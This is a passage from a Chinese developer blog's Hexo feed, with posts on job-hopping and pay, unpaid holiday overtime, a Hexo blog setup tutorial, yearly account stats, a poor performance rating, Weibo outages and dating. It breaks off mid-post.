        <content type="html"><![CDATA[<p>年底了，还有几天就要过年了，年后必定又是一波跳槽季，我们为什么要跳槽，为什么公司不能满足我们加薪的需求？</p><p>说到这个话题，想必从事码农的各位都清楚的一个道理：工资都是跳出来的，其他行业我不太清楚，但在 IT 行业，这是铁定的事实。公司即使加薪，也只是普调、阳光普照、雨露均沾而已，特别人、特别岗位除外。</p><p>有时候你可能真不想跳槽，被迫离开公司，你可能在公司干得非常好，工作很开心，同事关系也不错，但人都是要往上走的，都是要吃饭的，工作是为了啥，肯定不是为了情怀，而是为了让自己和家人有更好的生活。</p><p>所以，今天栈长和大家来聊聊这个尴尬的话题：</p><blockquote><p>为什么公司宁愿 25K 重新招人，也不给你加到 20K？</p></blockquote><p><strong>1、成本</strong></p><p>因为成本原因，公司很少会主动给员工加薪。</p><p>比如你现在 15K，给你调到 20K，你上面、上上面的管理层可能要调的就更多，进而所有的人都会要调，给公司带来的成本不是一个小数目；</p><p><strong>2、换血</strong></p><p>老员工在公司有一定时间了，可以说是老油条了，虽然对公司整体业务非常熟悉，但整体是缺乏积极性和创造力的，末尾淘汰原则，这时候公司会利用这个来淘汰一批可有可无的老员工，从而引进一些更优质的新鲜血液，提高公司的积极性和创造力。</p><p>一个公司的人员流动性很重要，如果流动性太大，对公司势必是致命一击，如果没有流动性，公司整体积极性和创造力又会不足，换血必不可少，所以给你加到 20K 也变得不是必须。</p><p><strong>3、可替代</strong></p><p>哪天，你请几天假试试，看公司会不会有人给你打电话协助，如果没有，你就很危险了，随时都可以被取代。你不是公司必不可少的，为什么要加给你加到 20K？</p><p>所以公司不会满足你的要求，会重新招人，招的人工资可能比你高，但能力肯定也在你之上。</p><p>现在知道，掌握核心技术有多重要了吧？</p><p><strong>总结</strong></p><p>综合以上原因，所以公司宁愿花 25K 重新招人，也不会给你加到 20K，除非你在公司必不可少、无可替代，或者你升职了，又或者老板是你亲戚，不然老实找工作吧！</p><p>所以跳槽已经成为了最快、最快速的涨薪方法。</p><p>关于跳槽，少不了面试，那怎么进一家好单位，还有其他什么坑，怎么提升自己的竞争力？推荐大家订购一个 IBM 大佬的专栏《<a href="https://mp.weixin.qq.com/s/B1XWjCvug2TUaWH-1FVXgg">面试现场</a>》，少躺坑，让自己面试能更顺利。可能一部分极端的人会一味认为这是广告，只有聪明的人才会看到另一面，从而学到更多的东西…</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国庆加了三天班，公司不给钱，咋办？</title>
      <link href="/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E5%9B%BD%E5%BA%86%E5%8A%A0%E4%BA%86%E4%B8%89%E5%A4%A9%E7%8F%AD%EF%BC%8C%E5%85%AC%E5%8F%B8%E4%B8%8D%E7%BB%99%E9%92%B1%EF%BC%8C%E5%92%8B%E5%8A%9E%EF%BC%9F/"/>
      <url>/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E5%9B%BD%E5%BA%86%E5%8A%A0%E4%BA%86%E4%B8%89%E5%A4%A9%E7%8F%AD%EF%BC%8C%E5%85%AC%E5%8F%B8%E4%B8%8D%E7%BB%99%E9%92%B1%EF%BC%8C%E5%92%8B%E5%8A%9E%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>没错，栈长我就遇到过这样的事情，那是在行业内还是小有名气和规模的中大型公司。国庆让我加了三天班，居然不想给钱？（&amp;……×（＠￥！……＆，粗话就不说了）</p><p>具体哪个公司我就不点名了，反正，最后，凭我的三寸不烂之舌，以及我打死不要脸一定要拿到钱的精神，我最终还是拿到钱了。</p><p>我这个人什么苦都能吃，就是不能吃亏，是自己的，我一定会去争取，不是自己的，一分也不会要，出来打工的，不都是为了赚钱么，难道出来做公益啊，别和我谈什么狼性文化，不给狼吃肉，狼早饿死了。</p><p>当然，话也不能说死，该拼搏的还是得拼搏，该给公司贡献的还是得贡献，但也不能被公司玩套路，一定要争取自己的权益，不能让自己受委屈，不坚持自己的原则，公司迟早会榨干你的剩余价值。</p><p>说了这么多，你们可能已经很好奇了，我为什么加了三天班，为什么公司不给我钱，最后我为什么还能拿到钱？</p><p>那是好几年前的事了，公司因政策问题，国庆需要紧急处理上线一些需求，然后，我作为未转正的新人，就被安排加班了。</p><p>加班就加班嘛，再苦再累，如果没有什么特别紧急的事，我想大家都会欣然接受的，何况还有三倍工资。</p><p>可狗血的是，提交的加班申请一直不给我批，节后，和我一起加班的其他同事都拿到钱了，我的还没批，心里苦啊，没办法，找领导说了一通，领导说什么我不在那个加班批次里面，还说经费已经超限什么的想来打发我。</p><p>我不乐意了，继续和他扯皮……</p><p>都是加班的，为什么就我没加班费？加班也是你让我加的，一方面不符合劳动法，另外一方面，这样做也会让下面的弟兄受委屈，以后谁还会愿意加班……</p><p>就这样，在我一翻狂轰乱炸之后，当然，我当时说话很客气的，领导估计也是心虚，顶不住压力吧，最后给我审核通过了，最后也拿到钱了。</p><p>其实也并不是多少钱的事，就受不了这气，新人就好欺负么？有这么坑手下的领导？虽然我从侧面也知道，公司各方面都在节省开支，福利一天不如一天，但这并不构成加班不付加班费的理由吧？</p><p>没干多久，我离职了……离职倒不是因为加班费的事，而是有了新的机会，再加上当时公司日益颓废的现状，更加坚定了我离职的想法。</p><p>好吧，回到话题，国庆加了三天班，公司不给钱，咋办？</p><p>在我看来，这种公司应该不多，即使发生了，先和上级沟通吧，如上级拒绝沟通，或者耍赖拒付加班费，那建议你申请劳动仲裁了，一般只要公司不是快要倒闭，或者不是不要脸到极点的公司，都不会走到这一步。</p><p>好了，今天就聊到这，关于假期加班，你有怎样类似的经历，欢迎留言分享。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从 0 开始搭建一个技术博客，私藏干货~</title>
      <link href="/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E4%BB%8E%200%20%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2%EF%BC%8C%E7%A7%81%E8%97%8F%E5%B9%B2%E8%B4%A7~/"/>
      <url>/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E4%BB%8E%200%20%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2%EF%BC%8C%E7%A7%81%E8%97%8F%E5%B9%B2%E8%B4%A7~/</url>
      
        <content type="html"><![CDATA[<p>技术博客的选型有很多种，如：博客园、CSDN、开源中国、简书、知乎等……都可以用来写文章，形成自己的技术博客。</p><p>上面的博客都是第三方的，有没有方式搭建自己的服务器、自己的域名的博客呢？栈长知道的成熟方案有：WordPress, Hexo 等，栈长的博客就是用 Hexo 搭建的。</p><p>今天分享一下，如何从 0 开始搭建一个自己的技术博客，基于栈长的 Hexo 博客。</p><h2 id="为什么选用-Hexo"><a href="#为什么选用-Hexo" class="headerlink" title="为什么选用 Hexo ?"></a>为什么选用 Hexo ?</h2><p>Hexo 是一个快速、简洁且高效的博客框架，利用 Markdown 即可自动生成静态网页。</p><blockquote><p>官网：<a href="https://hexo.io/">https://hexo.io/</a></p></blockquote><p><strong>1）超快速度</strong></p><p>Node.js 所带来的超快生成速度，让上百个页面在几秒内瞬间完成渲染。</p><p><strong>2）支持 Markdown</strong></p><p>Hexo 支持 GitHub Flavored Markdown 的所有功能，甚至可以整合 Octopress 的大多数插件。</p><p><strong>3）一键部署</strong></p><p>只需一条指令即可部署到 GitHub Pages, Heroku 或其他网站。</p><p><strong>4）丰富的插件</strong></p><p>Hexo 拥有强大的插件系统，安装插件可以让 Hexo 支持 Jade, CoffeeScript。</p><p>以上来自 Hexo 官网介绍。</p><h2 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h2><p>想拥有自己的博客，域名和服务器是不可少的两个部件。</p><p><strong>1）域名</strong></p><p>注册域名很简单的，几十块钱搞定的事，大家可以去万网、阿里云、腾讯云等平台上面注册。</p><p><strong>2）服务器</strong></p><p>可以使用各种云服务器，也可以使用 Gitbub 提供的 Pages 托管服务。</p><p>Github 的国内访问不是很快，这里推荐使用自己搭建国内的云服务器，使用 Nginx 搭建静态服务。</p><h2 id="Hexo-安装"><a href="#Hexo-安装" class="headerlink" title="Hexo 安装"></a>Hexo 安装</h2><p>安装 Hexo 需要提前安装好 NodeJs，这里就不说明了，自行安装即可。</p><p>安装好 NodeJs 之后就可以安装 Hexo 了：</p><p><strong>1）安装</strong></p><pre class="line-numbers language-none"><code class="language-none">npm install hexo-cli -g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2）初始化</strong></p><pre class="line-numbers language-none"><code class="language-none">hexo init blogcd blognpm install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>3）启动</strong></p><pre class="line-numbers language-none"><code class="language-none">hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者简写：</p><pre class="line-numbers language-none"><code class="language-none">hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>4）访问</strong></p><p>打开 <code>localhost:4000</code> 即可打开默认的博客主页：</p><p><img src="http://qianniu.javastack.cn/18-12-18/82627520.jpg"></p><h2 id="Hexo-文件介绍"><a href="#Hexo-文件介绍" class="headerlink" title="Hexo 文件介绍"></a>Hexo 文件介绍</h2><p>来看下 blog 目录下生成的目录和文件：</p><pre class="line-numbers language-none"><code class="language-none">$ lltotal 125-rw-r--r-- 1 R 1049089  1846 十二 18 14:12 _config.yml-rw-r--r-- 1 R 1049089 21622 十二 18 14:15 db.jsondrwxr-xr-x 1 R 1049089     0 十二 18 14:15 node_modules&#x2F;-rw-r--r-- 1 R 1049089   447 十二 18 14:15 package.jsondrwxr-xr-x 1 R 1049089     0 十二 18 14:12 scaffolds&#x2F;drwxr-xr-x 1 R 1049089     0 十二 18 14:12 source&#x2F;drwxr-xr-x 1 R 1049089     0 十二 18 14:12 themes&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>介绍下这几个目录和文件：</p><p><strong>_config.yml</strong>：博客主要的配置文件；</p><p><strong>node_modules</strong>：NodeJs的依赖模块；</p><p><strong>scaffolds</strong>：提供了三种不同的文章模版；</p><table><thead><tr><th>文章布局</th><th>对应目录</th></tr></thead><tbody><tr><td>post</td><td>source&#x2F;_posts</td></tr><tr><td>page</td><td>source</td></tr><tr><td>draft</td><td>source&#x2F;_drafts</td></tr></tbody></table><p><strong>source</strong>：博客文章默认所在的目录；</p><p><strong>themes</strong>：博客主题目录，默认：landscape；</p><h2 id="创建一篇文章"><a href="#创建一篇文章" class="headerlink" title="创建一篇文章"></a>创建一篇文章</h2><p><strong>1）创建文章</strong></p><p>使用命令：</p><pre class="line-numbers language-none"><code class="language-none">hexo new &quot;My New Post&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样默认为 post 文章，或者直接复制草稿模板至 source&#x2F;_posts 目录；</p><p><strong>2）生成静态网页</strong></p><pre class="line-numbers language-none"><code class="language-none">hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用简写：</p><pre class="line-numbers language-none"><code class="language-none">hexo g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就能在博客目录生成一个 public 目录。</p><pre class="line-numbers language-none"><code class="language-none">$ lltotal 12drwxr-xr-x 1 R 1049089    0 十二 18 14:40 2018&#x2F;drwxr-xr-x 1 R 1049089    0 十二 18 14:40 archives&#x2F;drwxr-xr-x 1 R 1049089    0 十二 18 14:40 css&#x2F;drwxr-xr-x 1 R 1049089    0 十二 18 14:40 fancybox&#x2F;-rw-r--r-- 1 R 1049089 6660 十二 18 14:40 index.htmldrwxr-xr-x 1 R 1049089    0 十二 18 14:40 js&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如需要重新生成可以执行一下清理命令：</p><pre class="line-numbers language-none"><code class="language-none">hexo clean<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>3）发布到服务器</strong></p><p>如果使用了 Github 的 Pages 托管服务，那么需要配置 <code>_config.yml</code> 中的如下配置：</p><pre class="line-numbers language-none"><code class="language-none">deploy:  type: git  repo:     - git@github.com:xxxxxx&#x2F;javastack.github.io.git  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后使用发布命令：</p><pre class="line-numbers language-none"><code class="language-none">hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果使用云服务器，将静态服务器的主目录设置为 public 这个目录即可。</p><h2 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h2><blockquote><p>主题选择：<a href="https://hexo.io/themes/">https://hexo.io/themes/</a></p></blockquote><p>在 Hexo 的主题网站下载一个自己的主题，如栈长的博客使用的是 icarus。下载之后把它扔到 themes 目录，然后修改配置文件中的默认主题即可。</p><pre class="line-numbers language-none"><code class="language-none">theme: icarus<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这个主题可以预览栈长的博客：<a href="http://www.javastack.cn/">www.javastack.cn</a></p></blockquote><p>也可以进入主题目录对这个主题进行自定义修改。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>大概的博客搭建及文章发布的操作就这些了，其实这里面还有更多的细节，包括插件、自定义主题、永久链接、文章分类、标签等，更多的大家可以去 Hexo 官方文档里面去看。还有，你得对 Markdown 格式需要熟悉。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>年底了，是时候做个了断了。。。</title>
      <link href="/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E5%B9%B4%E5%BA%95%E4%BA%86%EF%BC%8C%E6%98%AF%E6%97%B6%E5%80%99%E5%81%9A%E4%B8%AA%E4%BA%86%E6%96%AD%E4%BA%86%E3%80%82%E3%80%82%E3%80%82/"/>
      <url>/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E5%B9%B4%E5%BA%95%E4%BA%86%EF%BC%8C%E6%98%AF%E6%97%B6%E5%80%99%E5%81%9A%E4%B8%AA%E4%BA%86%E6%96%AD%E4%BA%86%E3%80%82%E3%80%82%E3%80%82/</url>
      
        <content type="html"><![CDATA[<p>时间总是过得太快，2018年又离我们远去了。</p><p>先来看下我们的年度报表吧：</p><p><img src="http://img.javastack.cn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190118091842.jpg"></p><p>单从发文数量来看，就能看出这是一个干货满满的公众号了，同时也清楚的看到了栈长这一年的辛勤默默付出。。。</p><p>下面是 2018 年详细的数据统计。</p><h4 id="年度推文-480-篇"><a href="#年度推文-480-篇" class="headerlink" title="年度推文 480+ 篇"></a>年度推文 480+ 篇</h4><p>年度公众号累计推文共 483 篇，其中包含原创文章 150+ 篇，365 天更是无中断推送，栈长没有功劳，也是有苦劳的。</p><p>大家可以翻看历史记录或者点击公众号菜单中「精选」菜单，栈长已经归类整理好了。</p><h4 id="年度阅读-250W-次"><a href="#年度阅读-250W-次" class="headerlink" title="年度阅读 250W+ 次"></a>年度阅读 250W+ 次</h4><p>年度公众号推文累积阅读共 2,589,029 次，包含头条、次条阅读。其中，最高的文章阅读数达到 22,000+，上万阅读的更是多不甚数。</p><h4 id="年度点赞-8K-次"><a href="#年度点赞-8K-次" class="headerlink" title="年度点赞 8K+ 次"></a>年度点赞 8K+ 次</h4><p>年度公众号推文累积点赞数共 807,3 个，大家总不喜欢给栈长点赞，写文章花了半天时间，到头来点赞数寥寥无几，甚是心寒。点赞数虽然不会有直接经济效益，但却是给作者最大的鼓励，2019 拜托各位老铁多点一下「好看」，能突破 1W+，这样我写文章就更有劲了。</p><h4 id="累积粉丝破-10W-人"><a href="#累积粉丝破-10W-人" class="headerlink" title="累积粉丝破 10W+ 人"></a>累积粉丝破 10W+ 人</h4><p>年底，12月份，公众号累积粉丝终于突破 10W+，通过后台分析，大多来自北上广深杭，其中北京的老铁最多，遥遥领先。男女比例数为：9：1，女程序媛真稀少啊。19年上半年目标有希望能突破 15W+，下半年能突破 20W+。</p><p>下面是西瓜数据的大致评定，头条平均阅读 9K+，西瓜指数 568，互联网排名第 97 位。</p><p><img src="http://img.javastack.cn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190118172947.png"></p><p>更多知识星球的介绍和细节，请点击文末阅读原文链接。</p><h4 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h4><p>这一路走来，真心不容易，没有谁能随随便便成功，这一切都归功于栈长的不懈努力，以及对技术知识点源源不断免费的输出给大家。</p><p>这一路走来，说实话，感谢太多人，太多的合作伙伴。</p><hr><p>最后，给大家带来了 20 本技术书籍，免费 + 包邮，这次送给这一年来默默支持栈长的朋友们。</p><p><img src="http://img.javastack.cn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_201901171743052.png"></p><blockquote><p>入门分布式系统，掌握分布式理论，提供实战案例。</p></blockquote><p><img src="http://img.javastack.cn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190117174305.png"></p><blockquote><p>结合作者十几年的工作经验，总结了一套系统又详细、且可落地的中小研发团队架构实践指导方案。</p></blockquote><p><img src="http://img.javastack.cn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_201901171743051.png"></p><blockquote><p>聚焦Redis实战，探究Redis源码与核心原理，轻松通过技术面试，进入心仪名企业。</p></blockquote><p><img src="http://img.javastack.cn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_201901171743054.png"></p><blockquote><p>精选自1000多个一线业务实际案例，真正从原理到实践全景式讲解Netty项目实践。</p></blockquote><p><img src="http://img.javastack.cn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_201901171743053.png"></p><blockquote><p>Kafka几乎成为大数据解决方案的标配组件，在大型推荐系统、搜索等场景中有着广泛的使用。</p></blockquote><p>感谢电子工业出版社博文视点的友情赞助，以上 5 本书各 4 本，我会从精选留言和赞赏记录中选出各 10 本，先到先选，喜欢这些书籍的也可以自行购买。</p><p>1、10本送给精选留言的粉丝，大家在下面留言吧，中奖的我会回复留言告知，留言板有条数限制，随意留言的不一定会精选上墙哦。平时经常留言、点赞、分享、栈长眼熟的朋友们被选中的机率会很大，感谢各位。</p><p>2、10本送给赞赏本文的粉丝，平时栈长几乎不会开赞赏功能，免费分享。这次总结，开一次赞赏吧，看你对栈长这一年来的认可程度了。本次打赏的，我都会回复我的微信号，大家可以加栈长的个人微信，栈长平时经常在朋友圈发福利，好处多多，所以，这次能好好吃个鸡腿么？</p><p>2019，我还憋着很多干货没发呢~</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕业不到一年，绩效打了个D！</title>
      <link href="/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E6%AF%95%E4%B8%9A%E4%B8%8D%E5%88%B0%E4%B8%80%E5%B9%B4%EF%BC%8C%E7%BB%A9%E6%95%88%E6%89%93%E4%BA%86%E4%B8%AAD%EF%BC%81/"/>
      <url>/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E6%AF%95%E4%B8%9A%E4%B8%8D%E5%88%B0%E4%B8%80%E5%B9%B4%EF%BC%8C%E7%BB%A9%E6%95%88%E6%89%93%E4%BA%86%E4%B8%AAD%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>周末了，和大家来聊聊程序员工作态度的问题。</p><p>说说栈长的事迹吧，这是好多年前的事了，那时候，栈长才毕业不到一年，那次绩效打了个D！事后，我很气愤啊，我那时还在博客上写文章怒骂了部门经理，现在想起来，真是好笑。</p><p>当时，我们做的是一个智能终端设备，我负责接口的开发，用的还是 AXIS2 提供的 SOAP 协议开发的 Web Service 服务。</p><p>部门经理是个女的，虽戴副眼镜，长得也比较白净，但看起来是一个十分不好惹的女人，大姐大，很强势的。</p><p>那次出了个问题，她跑过来和我说我的接口写得有问题，我二话没说就顶了回去，我说是前端页面的问题，不是我接口的问题。</p><p>于是那个月绩效我成功就打了个D，还要扣钱，尼玛，我那时候工资才1500。。。</p><p><img src="http://qianniu.javastack.cn/18-11-27/96469543.jpg"></p><p>来看看当时那种奇葩的考核制度，简直就是扣钱考核，哪里是什么绩效考核。如果大家遇到这种考核的公司，建议不要去。</p><ul><li>A：优秀，加少量工资</li><li>B：良好，不扣工资</li><li>C：一般，扣10%</li><li>D：及格，扣20%</li><li>E：不及格，扣。。不记得了。</li></ul><p>至于后面具体的经过我也忘了，不管是我接口有问题，还是前端页面的问题，我觉得这都不是问题的重点，重点是我的态度有问题。</p><p>那时候，刚毕业，年轻气盛，不知人情世故。如果当时我和她说我先看看我写的接口再回复她，而不是看都不看就和她说不是我的问题，就不会有后面的一系列的矛盾了。</p><p>这事虽过去好多年了，但这事却始终印在我心里面，一直提醒着我要有谦虚好学的心态，保持良好的工作态度，到现在也不能忘怀。</p><p>我想有很多程序员和栈长刚毕业时候一样，有这样不好的心态，这种心态，也许是年轻好胜，也许是出于人性的心理自卫。</p><p>所以，以此分享给大家，千万不要这种心态，不然你的前程不会太好。</p><p>@All 对此你有什么想说的？欢迎留言。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微博什么技术啊……还说支持八个明星并发出轨，结果…</title>
      <link href="/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E5%BE%AE%E5%8D%9A%E4%BB%80%E4%B9%88%E6%8A%80%E6%9C%AF%E5%95%8A%E2%80%A6%E2%80%A6%E8%BF%98%E8%AF%B4%E6%94%AF%E6%8C%81%E5%85%AB%E4%B8%AA%E6%98%8E%E6%98%9F%E5%B9%B6%E5%8F%91%E5%87%BA%E8%BD%A8%EF%BC%8C%E7%BB%93%E6%9E%9C%E2%80%A6/"/>
      <url>/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E5%BE%AE%E5%8D%9A%E4%BB%80%E4%B9%88%E6%8A%80%E6%9C%AF%E5%95%8A%E2%80%A6%E2%80%A6%E8%BF%98%E8%AF%B4%E6%94%AF%E6%8C%81%E5%85%AB%E4%B8%AA%E6%98%8E%E6%98%9F%E5%B9%B6%E5%8F%91%E5%87%BA%E8%BD%A8%EF%BC%8C%E7%BB%93%E6%9E%9C%E2%80%A6/</url>
      
        <content type="html"><![CDATA[<p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181016/5a2a9bfb0fe54969ab295a081a5b26f2.jpeg"></p><p>是的，大家可能都知道了，女神张靓颖结婚了。。</p><p>我去，写错了，是————赵丽颖。</p><p>为什么我头脑一瞬间出现的是张靓颖，作为一个码农，技术宅，拼音缩小都是 ZLY，博主我真有点傻傻分不清楚了。。</p><p>我也是昨天吃午饭时通过某 APP 首页新闻看到的，几乎所有的媒体都在报道，现在互联网这么发达，想不知道都不行啊。</p><p>消息一出，同事们和网友们都炸了，为了求证，博主特意去了趟微博，看到了榜单《官宣》。。女神依然很美，可这位男主角呢？让博主我有点意外啊，对他真不太熟。。</p><p><img src="http://img.javastack.cn/18-10-16/32039799.jpg"></p><p>女神就是女神，微博一发，由于巨大的流量同时涌入微博，造成了微博服务器陷入瘫痪，有的网友表示打开微博巨卡，有的网友搜索关键字赵丽颖显示网络异常，有的网友点击照片打不开等各种网络故障问题。。。</p><p><img src="https://ss2.baidu.com/6ONYsjip0QIZ8tyhnq/it/u=2657447051,2342266352&fm=173&app=25&f=JPEG?w=640&h=1169&s=790C34720B4361665CCD80CA0000E0B1"></p><p>不过，由于博主下班时间才去看，服务器已得到修复，并没有发现以上的问题，所以可以点开看到了。</p><p>来，上高清图。</p><p><img src="http://img.javastack.cn/18-10-16/72359235.jpg"></p><p>说到微博服务器经常瘫痪的问题，一直是个埂，饱受诟病。</p><p>不是说微博可以同时应对三个明星出轨吗？就在去年 10 月 8 号那天，鹿晗公布恋情时后就崩溃了。事后，工程师扩容整改，又宣称可以同时并发支持八个明星出轨，可结果呢？</p><p><img src="http://www.diankeji.com/uploads/file/news/2017-11-03/c416f1411ac15d540c719f1074f880a9.jpg"></p><p>其实这也不能怪微博，人家只是说同时支持八个明星并发出轨，没有说支持结婚！</p><p>难道八个同时出轨的流量还没一人结婚的流量大？</p><p>据微博工程师透露，赵丽颖这一次结婚事件带来的的流量比鹿晗那次还要大很多，赵丽颖这国民媳妇热度真没谁了，几百上千万粉丝为之疯狂。。。</p><p>然而，悲伤的是，她已不再是国民媳妇了……</p><p><img src="http://img.javastack.cn/18-10-16/93783683.jpg"></p><p>事后，于是网络上就有人报怨微博的技术能力了，还说同时支持八个，一个明星结婚就顶不住了。关于微博能同时支持八个明星并发出轨，现在都成了一个埂，成就了一个个段子在博主朋友圈刷屏。。</p><p><img src="http://img.javastack.cn/18-10-16/39449918.jpg"></p><p><strong>话又说回来，难道微博的技术真有这么烂吗？</strong></p><p>极客时间称，微博的信息流后端架构经历了单体应用 -&gt; 微服务架构 -&gt; 容器化应用 -&gt; DevOps 的发展历程。</p><p>2017 年初，微博刚刚改造完微博架构，对原有的单体应用架构进行改造，把功能相对独立的模块拆分出去，部署为微服务，分别交给专门的更小的团队来维护。再到后来又引入了 Docker 容器化，以及 Service Mesh 等技术，为了更好地适应微博业务的高速发展。</p><p>按道理来说，改造成微服务应该能承载更多的并发啊，为什么还会反复出问题呢？</p><p>微服务是当下最火热的后端架构之一，现在不管什么公司，什么样的开发人员，开口闭口就谈微服务，上微服务，可知微服务的火热，就像当年的SSH。。微服务作为一个新的技术架构，还不成熟，肯定会遇到很多之前单体架构没有遇到的问题，都需要一步步填坑。</p><p>所以，微服务带来很多便利的同时，肯定会带来很多新兴问题和挑战。所以，不要盲目追求微服务架构，据我所知，就连阿里都没有很好的维护和管理好微服务。</p><p>即便如此，微博屡次发生这样的故障实属不该，微服务虽然问题多，但并不能背这个锅，也不能成为屡次出现故障的借口。</p><p>所以，这一次事件之后，希望微博工程师好好总结教训经验，也千万别再承诺支持多少位明星出轨了，先支持一个明星顺利结婚吧。。。不然长期以往，微博的公信力和技术实力势必会成为诟病。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>相亲无数，全靠招数</title>
      <link href="/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E7%9B%B8%E4%BA%B2%E6%97%A0%E6%95%B0%EF%BC%8C%E5%85%A8%E9%9D%A0%E6%8B%9B%E6%95%B0/"/>
      <url>/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E7%9B%B8%E4%BA%B2%E6%97%A0%E6%95%B0%EF%BC%8C%E5%85%A8%E9%9D%A0%E6%8B%9B%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>去年国庆，栈长分享了一次我的真实相亲经历：《<a href="https://mp.weixin.qq.com/s/6mozIg_mi4yIU02jg61CSQ">一个程序员的国庆血泪相亲史，惨败而归…</a>》，大家反响爆蓬，有的现在还在后台留言鼓励我，或者问我有没有找到女朋友之类的……</p><p>难得有时间放长假，可以好好休息下，不想写技术，就随便写写吧，再来谈谈我们程序员相亲吧，你们都好这口。</p><p>已婚、有对象的也可以参考下，是否深有感触。</p><p>其实栈长一路走来，同学、同事、亲戚、老师、七大姑八大姨什么的……介绍的相亲对象实在太多，都记不太清了，不过都没有好结局，全部都是不欢而散，最终还是靠自己，也许是缘分未到吧。</p><p>详细的相亲经历太多，也都太狗血，就不一一介绍了，我怕你没准备好纸巾，所有这篇只想谈谈我一路走来对程序员相亲的看法，也帮助那些一直单身的程序员们如何找到心仪的对象。</p><p>大家都知道，大多数程序员性格都比较闷骚、孤僻，有色心没色胆，包括我自己，走向相亲之路也很正常，其实就像上篇文章大多数粉丝留言所说的那样————因为颜值。</p><p>好吧，无可反驭，我认了~！</p><p>不能全认，过来人的经验再告诉你，也不完全是因为颜值，其实，一路走来，栈长我经历的女生、能在一起的机会也非常多，可惜啊，我还是相亲了，最重要的一点还是自己年轻的时候不够大胆，不够坚持，不够不要脸，如果能做这几点，我想我也不至于单身，我就是吃了炒短线的亏。</p><p>所以说，只要对方没对象，喜欢，就大胆去追吧，又不要命，怕个锤子。尽量不要炒短线，你没那个技术，对方一拒绝，你就放弃，一点也不坚持，错过了那就真错过了，也许对方只是试探你或者不好直接答应你才拒绝了你。</p><p>这样不是被白洗出局了？不是太可惜了？（哈哈，有些女生是真作），但如果真的追成了长线，那就要好好掂量有没有必要及时止损了。</p><p>如果实在找不到对象，帮你介绍的七大